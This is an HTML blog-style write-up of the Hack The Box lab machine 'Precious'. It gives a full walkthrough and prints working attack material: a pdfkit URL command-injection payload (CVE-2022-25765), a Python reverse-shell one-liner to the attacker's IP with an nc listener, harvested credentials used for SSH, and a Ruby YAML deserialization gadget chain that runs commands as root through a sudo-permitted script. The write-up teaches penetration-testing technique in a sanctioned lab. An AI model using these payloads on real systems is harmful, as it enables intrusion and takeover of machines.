@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+
+<html lang="en">
+  <head>
+    <link rel="stylesheet" href="/_assets/css/styles.css"> 
+    <meta charset="utf-8">
+    <title>Precious Writeup</title>
+  </head>
+  <body class="page-body">
+    <div class="page-body-container">
+      <div class="page-body-content-container">
+        <h1 class="page-title">Precious Writeup</h1>
+        
+        
+        
+        
+        <p class="page-date-author-readtime">March 24, 2023 | 13 minutes </p>
+      
+        
+<h1 id="enumeration">Enumeration</h1>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.93 scan initiated Mon Feb 20 17:17:13 2023 as: nmap -p- -sCV --min-rate=10000 -o preciousnmap.txt 10.10.11.189</span>
+Warning: 10.10.11.189 giving up on port because retransmission cap hit <span class="o">(</span>10<span class="o">)</span><span class="nb">.</span>
+Nmap scan report <span class="k">for </span>precious.htb <span class="o">(</span>10.10.11.189<span class="o">)</span>
+Host is up <span class="o">(</span>0.090s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65257 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>, 276 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 845e13a8e31e20661d235550f63047d2 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 a2ef7b9665ce4161c467ee4e96c7c892 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 33053dcd7ab798458239e7ae3c91a658 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nginx 1.18.0
+|_http-title: Convert Web Page to PDF
+| http-server-header:
+|   nginx/1.18.0
+|_  nginx/1.18.0 + Phusion Passenger<span class="o">(</span>R<span class="o">)</span> 6.0.15
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; <span class="nb">.</span>
+<span class="c"># Nmap done at Mon Feb 20 17:17:35 2023 -- 1 IP address (1 host up) scanned in 21.95 seconds</span>
+</code></pre></div></div>
+<p>The website has a text input box, and the purpose of it is to convert web pages to PDF files. I started playing around with it:</p>
+
+<p><img src="/_assets/images/writeups//precious/img1.png" alt="Untitled" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">http://10.10.11.189</code> , it’s own IP address, returned <code class="language-plaintext highlighter-rouge">Cannot load remote URL!</code>. Okay, so I can assume a <code class="language-plaintext highlighter-rouge">http://</code> format. I tried different variations: <code class="language-plaintext highlighter-rouge">http://localhost</code> and <code class="language-plaintext highlighter-rouge">http://localhost</code> both returned the same thing - <code class="language-plaintext highlighter-rouge">Cannot load remote URL!</code>.</p>
+
+<p>So I wasn’t able to get the server to convert itself into a PDF, how about another IP on its network? How about me? So I spun up my own web server.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python3 -m http.server 80
+</code></pre></div></div>
+<p>Note how I specified port 80; this is because <code class="language-plaintext highlighter-rouge">http://</code> expects port 80 at default, while the <code class="language-plaintext highlighter-rouge">http.server</code> module sets itself to 8080 by default.</p>
+
+<p>I entered my VPN network interface IP address <code class="language-plaintext highlighter-rouge">http://10.10.14.4</code>, and what do you know, it returned a PDF of my web page.
+<img src="/_assets/images/writeups//precious/img18.png" alt="Untitled" /></p>
+
+<h1 id="initial-access">Initial Access</h1>
+<p>Now that I had something new to work with, I wanted to know more about the generated file. I downloaded the file and ran a common file forensics tool called <code class="language-plaintext highlighter-rouge">exiftool</code> on it.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>exiftool fo99la37ukytqmhduq8elzoqbudbyvu9.pdf
+
+ExifTool Version Number         : 12.52
+File Name                       : fo99la37ukytqmhduq8elzoqbudbyvu9.pdf
+Directory                       : <span class="nb">.</span>
+File Size                       : 36 kB
+File Modification Date/Time     : 2023:02:20 16:39:42-08:00
+File Access Date/Time           : 2023:02:20 16:40:16-08:00
+File Inode Change Date/Time     : 2023:02:20 16:39:42-08:00
+File Permissions                : <span class="nt">-rw-r--r--</span>
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.4
+Linearized                      : No
+Page Count                      : 1
+Creator                         : Generated by pdfkit v0.8.6
+</code></pre></div></div>
+<p>The “Creator” line sparked my eye due to the version number, which is helpful when searching for valid exploits. My first instinct was to search for <code class="language-plaintext highlighter-rouge">pdfkit v0.8.6 exploits</code>. And just like that, the first search return is an exploit titled <a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwiAruHj8caBAxWBJkQIHa6cD8gQFnoECA0QAQ&amp;url=https%3A%2F%2Fsecurity.snyk.io%2Fvuln%2FSNYK-RUBY-PDFKIT-2869795&amp;usg=AOvVaw3XwwN6FWqgJj89L6M70wWi&amp;opi=89978449">Command Injection in pdfkit | CVE-2022-25765</a>.</p>
+
+<p>After reading the exploit’s documentation, this version of <code class="language-plaintext highlighter-rouge">pdfkit</code> seems to feature a vulnerability where the URL was not properly sanitized. This allows for a URL parameter to be “included in the command that PDFKit executes to render the PDF”, as per the blog post.</p>
+
+<p>So I constructed the following URL where I appended my own parameter named <code class="language-plaintext highlighter-rouge">bruh</code> denoted by the URL encoding <code class="language-plaintext highlighter-rouge">?bruh=%20</code>, and assigned it a value, which would be the shell commanded I wanted to execute, denoted by <code class="language-plaintext highlighter-rouge">`id`</code>.</p>
+
+<p>I had to do was establish a parameter containing a URL encoded character, and specify the shell command I wanted it to execute:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.14.6?bruh=%20`id`
+</code></pre></div></div>
+<p><img src="/_assets/images/writeups//precious/img19.png" alt="Untitled" /></p>
+
+<p>And boom, I was returned a pdf that displayed my user id. Since I confirmed that this code injection exploit was valid, I wanted to establish a reverse shell. There are a variety of ways to do this depending on what technologies are on the machine, but a quick and usually available way is using Python. When establishing a reverse shell, you want a listener on your attacking machine, and for your victim machine to execute something that establishes a remote connection to you, the attacking machine.</p>
+
+<p>After inputting this to the site, I was returned a pdf that displayed my user id. Confirming that code injection worked, I chose to establish a reverse shell using Python. When establishing a reverse shell in general, you want to have a listener on your attacking machine, and for your victim machine to execute code that will establish remote connection to <strong>you</strong>.</p>
+
+<p>I validated Python existed on the box.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.14.6/?bruh=%20`which python3`
+</code></pre></div></div>
+<p><img src="/_assets/images/writeups//precious/img21.png" alt="Untitled" /></p>
+
+<p>Awesome, it exists, I can carry on with my plan. I started my listener using <code class="language-plaintext highlighter-rouge">nc</code>.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 7777
+</code></pre></div></div>
+<p>I grabbed my reverse shell code from <a href="revshells.com">revshells.com</a>, which has a curated list of reverse shells for different technologies. Again, this is the code to be executed on the victim machine. I can execute this code the same way I executed the <code class="language-plaintext highlighter-rouge">id</code> and <code class="language-plaintext highlighter-rouge">which python3</code> command - through the web application.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.6",7777));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
+</code></pre></div></div>
+<p>The web server should also still be running. The program needs some valid web page as that is part of the intended functionality. The unintended functionality - the exploit, is the URL parameter. I sent the following URL to obtain my reverse shell.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.14.6/?bruh=%20`python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.6",7777));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'`
+</code></pre></div></div>
+<p><img src="/_assets/images/writeups//precious/img23.png" alt="Untitled" />
+And there was my shell.
+<img src="/_assets/images/writeups//precious/img22.png" alt="Untitled" /></p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>I had access to the machine, but I was user <code class="language-plaintext highlighter-rouge">ruby</code>. The first thing I do after initial access to a machine is look at the obvious such as the contents of files (including hidden files).</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span>
+total 36K
+drwxr-xr-x 6 root root 4.0K Oct 26  2022 <span class="nb">.</span>
+drwxr-xr-x 4 root root 4.0K Oct 26  2022 ..
+drwxr-xr-x 4 root ruby 4.0K Oct 26  2022 app
+drwxr-xr-x 2 root ruby 4.0K Oct 26  2022 config
+<span class="nt">-rw-r--r--</span> 1 root ruby   59 Sep 10  2022 config.ru
+<span class="nt">-rw-r--r--</span> 1 root ruby   99 Sep 17  2022 Gemfile
+<span class="nt">-rw-r--r--</span> 1 root ruby  478 Sep 26  2022 Gemfile.lock
+drwxrwxr-x 2 root ruby 4.0K Sep 26 15:54 pdf
+drwxr-xr-x 4 root ruby 4.0K Oct 26  2022 public
+</code></pre></div></div>
+<p>The directory I landed in didn’t seem to be a home directory. Instead, I was in <code class="language-plaintext highlighter-rouge">/var/www/pdfapp</code>. After some digging in that directory, I looked into <code class="language-plaintext highlighter-rouge">ruby</code>’s home directory.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lah</span>
+total 28K
+drwxr-xr-x 4 ruby ruby 4.0K Sep 24 22:04 <span class="nb">.</span>
+drwxr-xr-x 4 root root 4.0K Oct 26  2022 ..
+lrwxrwxrwx 1 root root    9 Oct 26  2022 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 ruby ruby  220 Mar 27  2022 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 ruby ruby 3.5K Mar 27  2022 .bashrc
+dr-xr-xr-x 2 root ruby 4.0K Oct 26  2022 .bundle
+drwxr-xr-x 3 ruby ruby 4.0K Sep 24 22:04 .cache
+<span class="nt">-rw-r--r--</span> 1 ruby ruby  807 Mar 27  2022 .profile
+</code></pre></div></div>
+<p>After looking through all the files and directories, I finally found credentials in <code class="language-plaintext highlighter-rouge">~/.bundle/config</code> to user <code class="language-plaintext highlighter-rouge">henry</code>.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>config
+<span class="nt">---</span>
+BUNDLE_HTTPS://RUBYGEMS__ORG/: <span class="s2">"henry:Q3c1Aq......aXAYFH"</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">henry</code> existed on the machine, so I attempted to login using <code class="language-plaintext highlighter-rouge">ssh</code>.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh henry@10.10.11.189
+</code></pre></div></div>
+<p>The credentials were valid, and I logged in as <code class="language-plaintext highlighter-rouge">henry</code>.</p>
+
+<p>From here, the next and last step was escalating to <code class="language-plaintext highlighter-rouge">root</code>. After some looking around, I wasn’t able to find much. I tried running <code class="language-plaintext highlighter-rouge">sudo -l</code>, which would reveal binaries explicitly enabled for my user to run as root, also known as an SUID.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>henry on precious:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User henry may run the following commands on precious:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+</code></pre></div></div>
+<p>And just like that, it revealed that I could run <code class="language-plaintext highlighter-rouge">/usr/bin/ruby /opt/update_dependencies.rb</code> as <code class="language-plaintext highlighter-rouge">root</code>! I instantly took a look at the ruby file I was permitted to run.</p>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">henry</span><span class="vi">@precious</span><span class="ss">:~</span><span class="err">$</span> <span class="n">cat</span> <span class="sr">/opt/u</span><span class="n">pdate_dependencies</span><span class="p">.</span><span class="nf">rb</span>
+<span class="c1"># Compare installed dependencies with those specified in "dependencies.yml"</span>
+<span class="nb">require</span> <span class="s2">"yaml"</span>
+<span class="nb">require</span> <span class="s1">'rubygems'</span>
+
+<span class="c1"># TODO: update versions automatically</span>
+<span class="k">def</span> <span class="nf">update_gems</span><span class="p">()</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">list_from_file</span>
+    <span class="no">YAML</span><span class="p">.</span><span class="nf">load</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="s2">"dependencies.yml"</span><span class="p">))</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">list_local_gems</span>
+    <span class="no">Gem</span><span class="o">::</span><span class="no">Specification</span><span class="p">.</span><span class="nf">sort_by</span><span class="p">{</span> <span class="o">|</span><span class="n">g</span><span class="o">|</span> <span class="p">[</span><span class="n">g</span><span class="p">.</span><span class="nf">name</span><span class="p">.</span><span class="nf">downcase</span><span class="p">,</span> <span class="n">g</span><span class="p">.</span><span class="nf">version</span><span class="p">]</span> <span class="p">}.</span><span class="nf">map</span><span class="p">{</span><span class="o">|</span><span class="n">g</span><span class="o">|</span> <span class="p">[</span><span class="n">g</span><span class="p">.</span><span class="nf">name</span><span class="p">,</span> <span class="n">g</span><span class="p">.</span><span class="nf">version</span><span class="p">.</span><span class="nf">to_s</span><span class="p">]}</span>
+<span class="k">end</span>
+
+<span class="n">gems_file</span> <span class="o">=</span> <span class="n">list_from_file</span>
+<span class="n">gems_local</span> <span class="o">=</span> <span class="n">list_local_gems</span>
+
+<span class="n">gems_file</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">file_name</span><span class="p">,</span> <span class="n">file_version</span><span class="o">|</span>
+    <span class="n">gems_local</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">local_name</span><span class="p">,</span> <span class="n">local_version</span><span class="o">|</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">file_name</span> <span class="o">==</span> <span class="n">local_name</span><span class="p">)</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">file_version</span> <span class="o">!=</span> <span class="n">local_version</span><span class="p">)</span>
+                <span class="nb">puts</span> <span class="s2">"Installed version differs from the one specified in file: "</span> <span class="o">+</span> <span class="n">local_name</span>
+            <span class="k">else</span>
+                <span class="nb">puts</span> <span class="s2">"Installed version is equals to the one specified in file: "</span> <span class="o">+</span> <span class="n">local_name</span>
+            <span class="k">end</span>
+        <span class="k">end</span>
+    <span class="k">end</span>
+<span class="k">end</span>
+</code></pre></div></div>
+<p>Well this certainly didn’t look fun. I don’t know anything about <code class="language-plaintext highlighter-rouge">ruby</code>, much less how to read it. But the thing is, I didn’t need to know how to read it. I attempted to run the command and received the following output.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~<span class="nv">$ </span><span class="nb">sudo </span>ruby /opt/update_dependencies.rb
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+        2: from /opt/update_dependencies.rb:17:in <span class="sb">`</span>&lt;main&gt;<span class="s1">'
+        1: from /opt/update_dependencies.rb:10:in `list_from_file'</span>
+/opt/update_dependencies.rb:10:in <span class="sb">`</span><span class="nb">read</span><span class="s1">': No such file or directory @ rb_sysopen - dependencies.yml (Errno::ENOENT)
+</span></code></pre></div></div>
+<p>Having looked at the source code and previewing the command output, something that already stood out to me was that it was loading/reading a file called <code class="language-plaintext highlighter-rouge">dependencies.yml</code>. Furthermore, I wasn’t sure exactly where it was looking for this <code class="language-plaintext highlighter-rouge">dependencies.yml</code>. Perhaps it could possibly be looking for it locally? I created a local file in my home directory of the script and tried running the command again.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~<span class="nv">$ </span><span class="nb">touch </span>dependencies.yml
+henry@precious:~<span class="nv">$ </span><span class="nb">sudo </span>ruby /opt/update_dependencies.rb
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+/opt/update_dependencies.rb:20:in <span class="sb">`</span>&lt;main&gt;<span class="s1">': undefined method `each'</span> <span class="k">for </span><span class="nb">false</span>:FalseClass <span class="o">(</span>NoMethodError<span class="o">)</span>
+</code></pre></div></div>
+<p>That was surely a different output than the previous. Okay, so I knew that I could load whatever content I wanted through <code class="language-plaintext highlighter-rouge">dependencies.yml</code>. How could I use this to my advantage? I searched for <code class="language-plaintext highlighter-rouge">ruby yaml exploits</code> and I found a blog post titled “<a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/">Blind Remote Code Execution through YAML Deserialization</a>”.</p>
+
+<p>Awesome! To summarize the blog post, it looked like the author was accomplishing RCE by setting the <code class="language-plaintext highlighter-rouge">git_set</code> parameter in <code class="language-plaintext highlighter-rouge">dependencies.yml</code> to a shell command, which would be executed upon loading (<code class="language-plaintext highlighter-rouge">YAML.load()</code>). I used the code below from the author of the blog post as my <code class="language-plaintext highlighter-rouge">dependencies.yml</code>, although I changed <code class="language-plaintext highlighter-rouge">git_set</code> to <code class="language-plaintext highlighter-rouge">id</code>, which would be much easier to validate RCE.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="o">---</span>
+ <span class="o">-</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Gem</span><span class="o">::</span><span class="no">Installer</span>
+     <span class="ss">i: </span><span class="n">x</span>
+ <span class="o">-</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Gem</span><span class="o">::</span><span class="no">SpecFetcher</span>
+     <span class="ss">i: </span><span class="n">y</span>
+ <span class="o">-</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Gem</span><span class="o">::</span><span class="no">Requirement</span>
+   <span class="ss">requirements:
+     </span><span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span>
+     <span class="ss">io: </span><span class="o">&amp;</span><span class="mi">1</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Net</span><span class="o">::</span><span class="no">BufferedIO</span>
+       <span class="ss">io: </span><span class="o">&amp;</span><span class="mi">1</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span><span class="o">::</span><span class="no">Entry</span>
+          <span class="ss">read: </span><span class="mi">0</span>
+          <span class="ss">header: </span><span class="s2">"abc"</span>
+       <span class="ss">debug_output: </span><span class="o">&amp;</span><span class="mi">1</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Net</span><span class="o">::</span><span class="no">WriteAdapter</span>
+          <span class="ss">socket: </span><span class="o">&amp;</span><span class="mi">1</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Gem</span><span class="o">::</span><span class="no">RequestSet</span>
+              <span class="ss">sets: </span><span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">object</span><span class="ss">:Net</span><span class="o">::</span><span class="no">WriteAdapter</span>
+                  <span class="ss">socket: </span><span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">module</span> <span class="s1">'Kernel'</span>
+                  <span class="ss">method_id: :system</span>
+              <span class="ss">git_set: </span><span class="nb">id</span>
+          <span class="ss">method_id: :resolve</span>
+</code></pre></div></div>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~<span class="nv">$ </span><span class="nb">sudo </span>ruby /opt/update_dependencies.rb
+sh: 1: reading: not found
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+...
+/usr/lib/ruby/2.7.0/net/protocol.rb:458:in <span class="sb">`</span>system<span class="s1">': no implicit conversion of nil into String (TypeError)
+</span></code></pre></div></div>
+<p>Nice, I had RCE as <code class="language-plaintext highlighter-rouge">root</code>! To recall, I knew I could run the script as <code class="language-plaintext highlighter-rouge">root</code> after running <code class="language-plaintext highlighter-rouge">sudo -l</code>. Then, I accomplished RCE through the file <code class="language-plaintext highlighter-rouge">dependencies.yml</code> that was being loaded in the <code class="language-plaintext highlighter-rouge">update_dependencies.rb</code> script by deserialization.</p>
+
+<p>The last step was to run a shell command that would make me <code class="language-plaintext highlighter-rouge">root</code>. A quick way to do this was setting the command to <code class="language-plaintext highlighter-rouge">su</code>, which would change my user to <code class="language-plaintext highlighter-rouge">root</code>.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>henry@precious:~<span class="nv">$ </span><span class="nb">sudo </span>ruby /opt/update_dependencies.rb
+sh: 1: reading: not found
+root@precious:/home/henry#
+</code></pre></div></div>
+<p>And I’m done, I’m <code class="language-plaintext highlighter-rouge">root</code>!</p>
+
+<p>Something kinda fun I want to point out is how ruby is an interpreted language, meaning that the code runs line by line as it is interpreted into machine language. It is only when it encounters an error that it then stops running. This is why the code was able to run and provide me the output of <code class="language-plaintext highlighter-rouge">id</code> and even execute <code class="language-plaintext highlighter-rouge">su</code>, while returning error messages afterwards.</p>
+
+
+        
+      </div>
+      
+      
+      
+  </div> <!-- page-body-container END-->
+  </body>
+  <script>
+  $(document).ready(function() {
+  var toc = $("#toc"); // target the table of contents element
+  var tocEntries = toc.find("a"); // target the links within the table of contents
+  
+  $(window).scroll(function() {
+    // get the current scroll position of the window
+    var currentPosition = $(this).scrollTop();
+    
+    // loop through each link in the table of contents
+    tocEntries.each(function() {
+      // get the ID of the section of content that this link points to
+      var target = $(this).attr("href");
+      
+      // use the ID to target the corresponding section of content
+      var section = $(target);
+      
+      // if the section exists and its top position is within the current viewport
+      if (section.length && section.offset().top <= currentPosition + 200) {
+        // remove the active class from all links in the table of contents
+        tocEntries.removeClass("active");
+        
+        // add the active class to the link that corresponds to the current section
+        $(this).addClass("active");
+      }
+    });
+  });
+  });
+
+  </script>
+
+</html>
+
